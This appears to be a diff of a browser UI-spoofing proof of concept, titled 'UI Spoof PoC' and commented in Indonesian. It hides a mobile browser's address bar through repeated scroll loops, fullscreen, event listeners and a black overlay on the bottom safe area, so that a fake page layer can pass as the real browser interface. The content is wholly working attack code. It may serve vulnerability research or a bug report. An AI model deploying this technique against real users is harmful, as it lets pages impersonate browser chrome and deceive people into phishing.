@@ -4,18 +4,19 @@
   <title>UI Spoof PoC</title>
   <meta charset="utf-8">
   <meta name="viewport"
-        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      height: 300vh;
+      height: 300vh; /* wajib panjang */
       background: #000;
       font-family: system-ui, sans-serif;
       overscroll-behavior: none;
     }
 
+    /* layer utama */
     #spoof {
       position: fixed;
       inset: 0;
@@ -35,6 +36,19 @@
       justify-content: center;
       color: white;
       text-align: center;
+      z-index: 10;
+    }
+
+    /* penutup area bottom (safe area / omnibar) */
+    #bottomCover {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      height: env(safe-area-inset-bottom, 24px);
+      background: #000;
+      z-index: 10000;
+      pointer-events: none;
     }
   </style>
 </head>
@@ -47,39 +61,26 @@
   <h1>Click anywhere</h1>
 </div>
 
+<div id="bottomCover"></div>
+
 <script>
 let once = false;
 
 function hideOmnibarHard() {
   let i = 0;
   function loop() {
-    window.scrollTo(0, 1);
-    if (++i < 40) requestAnimationFrame(loop);
+    window.scrollTo(0, 1); // JANGAN PERNAH 0
+    if (++i < 50) requestAnimationFrame(loop);
   }
   loop();
 }
 
-onclick = async () => {
+onclick = () => {
   if (once) return;
   once = true;
 
-  // 1️⃣ SHARE (harus di user gesture)
-  if (navigator.share) {
-    try {
-      await navigator.share({
-        title: "Example",
-        text: "Check this out",
-        url: location.href
-      });
-    } catch (e) {
-      // user cancel = normal
-    }
-  }
-
-  // 2️⃣ hide omnibar
   hideOmnibarHard();
 
-  // 3️⃣ spoof + fullscreen
   content.style.display = "none";
   spoof.style.display = "block";
 
@@ -90,13 +91,13 @@ onclick = async () => {
 document.addEventListener("fullscreenchange", () => {
   if (!document.fullscreenElement) {
     setTimeout(hideOmnibarHard, 0);
-    setTimeout(hideOmnibarHard, 100);
-    setTimeout(hideOmnibarHard, 300);
-    setTimeout(hideOmnibarHard, 600);
+    setTimeout(hideOmnibarHard, 150);
+    setTimeout(hideOmnibarHard, 400);
+    setTimeout(hideOmnibarHard, 800);
   }
 });
 
-// fallback
+// fallback brutal
 window.addEventListener("resize", hideOmnibarHard);
 window.addEventListener("orientationchange", hideOmnibarHard);
 document.addEventListener("visibilitychange", () => {
